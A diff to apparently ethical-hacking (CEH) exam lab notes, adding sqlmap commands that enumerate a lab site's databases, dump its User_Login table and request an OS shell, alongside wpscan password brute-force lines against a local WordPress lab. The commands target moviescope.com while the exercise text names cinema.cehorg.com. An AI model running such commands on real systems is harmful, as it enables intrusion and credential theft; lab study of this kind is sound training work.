@@ -1141,7 +1141,10 @@ You are provided a username/password for a website. Use SQL Injection attack to 
 Perform the SQL injection attack on your target web application cinema.cehorg.com and extract the password of a user Sarah. 
 You have already registered on the website with credentials Karen/computer.
 
-sqlmap -u xxxx
+sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jWydNf8wro=; ui-tabs-1=0" --dbs
+sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jWydNf8wro=; ui-tabs-1=0" -D moviescope -tables
+sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jWydNf8wro=; ui-tabs-1=0" -D moviescope -T User_Login -dump
+sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jWydNf8wro=; ui-tabs-1=0" --os-shell
 
 wpscan --usernames sara -P password.txt --url http://192.168.0.222:8080/CEH/
 wpscan --url http://192.168.0.222:8080/CEH/ --passwords /home/rockyou.txt
@@ -1637,6 +1640,7 @@ http://snarkles.net/scripts/sneak/sneak.php
 http://utf-8.jp/public/jjencode.html
 
 http://ddecode.com/phpdecoder/
+
 
 
 
